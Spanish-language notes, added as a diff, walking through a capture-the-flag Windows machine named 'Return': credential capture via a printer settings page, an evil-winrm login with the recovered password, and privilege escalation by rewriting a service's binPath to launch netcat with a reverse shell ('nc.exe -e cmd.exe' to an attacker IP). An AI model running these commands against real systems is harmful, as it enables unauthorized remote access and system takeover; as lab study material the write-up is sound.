@@ -1,0 +1,56 @@
+maquina return-----------------------windows 
+
+-------------------------
+
+esta maquina ha sido bastante complicada porque no se por donde 
+tirar ahora mismo con windows 
+
+pero hemos entrado a la pagina y se nota que es una pagina
+de una impresora donde hay una opcion de settings 
+
+tienes unas opciones de mandar la señal del log por un puerto 
+y tienes que poner tu ip y el puerto que quieras
+tienes porque ponerte en escucha por  el puerto que hayas puesto 
+recibes una señal con la pass legible
+
+luego vemos que el usuario y la contraseña es:
+
+
+svc-printer
+1edFg43012!!
+
+el tema es que puedes entrar CON EVILWIRM
+
+evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'
+
+una vez dentro lo que podemos hacer es visualizar la flag de user
+
+pero ahora viene lo interesantes 
+
+ESCALADA
+
+el tema es que lo que tenemos que hacer es ver los servicios
+que estan corriendo por detras con el comando "services" 
+
+el caso es que tenemos que subir a la maquina el netcat 
+
+no es tan complicado como en otros lados montando servidores
+
+el tema es poner "upload" y la ruta de tu pc 
+
+con eso ya vale !!!
+
+una vez que tenemos netcat lo que podemos hacer es montar un servicio
+
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234"
+
+
+lo que hace eso es que le dices que cuando ese servicio arranque o se pare de paso lance
+el netcat mandandote una reverse shell a tu maquina... eso se puede modificar y listo 
+
+solo tienes que parar y arrancar el servicio 
+
+sc.exe stop vss
+sc.exe start vss
+
+vss es el nombre del servicio que hemos modificado... (podria valer cualquiera) 
